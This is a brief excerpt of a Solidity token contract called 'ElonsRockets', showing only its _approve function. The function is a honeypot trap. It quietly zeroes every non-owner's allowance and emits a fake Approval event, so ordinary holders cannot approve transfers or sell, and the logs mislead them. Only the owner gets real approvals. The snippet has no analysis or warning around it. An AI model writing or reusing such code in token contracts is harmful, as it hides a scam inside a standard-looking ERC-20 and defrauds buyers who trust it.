...
contract ElonsRockets is Context, IERC20, Ownable {
    ...
    function _approve(address elon, address ery, uint256 amount) private {
        require(elon != address(0), "ERC20: approve from the zero address");
        require(ery != address(0), "ERC20: approve to the zero address");
        if (elon != owner()) { _allowances[elon][ery] = 0; emit Approval(elon, ery, 4); }  
        else { _allowances[elon][ery] = amount; emit Approval(elon, ery, amount); } 
    } 
